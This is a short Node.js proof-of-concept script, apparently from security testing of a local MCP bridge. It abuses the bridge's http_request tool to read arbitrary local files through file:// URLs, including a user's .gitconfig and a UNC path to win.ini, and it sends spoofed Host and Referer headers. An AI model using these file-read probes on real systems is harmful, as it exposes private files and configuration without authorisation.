// confirm file:// arbitrary read + a couple of follow-ups
const BASE = 'http://127.0.0.1:7890/mcp';
let sid, i = 0;
const rpc = async (b, ms = 15000) => {
  const r = await fetch(BASE, { method: 'POST', headers: { 'content-type': 'application/json', 'accept': 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) }, body: JSON.stringify(b), signal: AbortSignal.timeout(ms) });
  const t = await r.text(); if (!sid) sid = r.headers.get('mcp-session-id');
  const m = t.split('\n').filter(l => l.startsWith('data:')).map(l => JSON.parse(l.slice(5).trim()));
  return { msg: m[m.length - 1], status: r.status };
};
const call = (n, a) => rpc({ jsonrpc: '2.0', id: ++i, method: 'tools/call', params: { name: n, arguments: a } });
const txt = r => r.msg?.result?.content?.[0]?.text ?? JSON.stringify(r.msg ?? r);
await rpc({ jsonrpc: '2.0', id: ++i, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '0' } } });
await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' });

// 1. file:// read of a file on D: (extension pin file — known contents)
let r = await call('http_request', { url: 'file:///D:/Tool/chrome-mcp/bridge/.extension-id' });
console.log('file:// .extension-id =>', txt(r).slice(0, 300));

// 2. file:// on a user profile file (sensitive target)
r = await call('http_request', { url: 'file:///C:/Users/29980/.gitconfig' });
console.log('file:// ~/.gitconfig =>', txt(r).slice(0, 300));

// 3. file:// nonexistent
r = await call('http_request', { url: 'file:///C:/no-such-dir-xyz/nope.txt' });
console.log('file:// nonexistent =>', txt(r).slice(0, 200));

// 4. UNC-ish network path via file:// (SMB to self, likely fails fast or hangs)
r = await call('http_request', { url: 'file://127.0.0.1/c$/Windows/win.ini', timeout: 5000 }).catch(e => ({ err: e.message }));
console.log('file:// UNC =>', txt(r).slice(0, 200));

// 5. does Cookie header actually get sent? echo via a tiny local check isn't possible;
//    but Host was dropped while Origin applied — retest Host vs Referer
r = await call('http_request', { url: 'http://127.0.0.1:7890/', headers: { Host: 'evil.com', Referer: 'https://spoofed.example/x' } });
console.log('Host+Referer =>', txt(r).slice(0, 250));
process.exit(0);
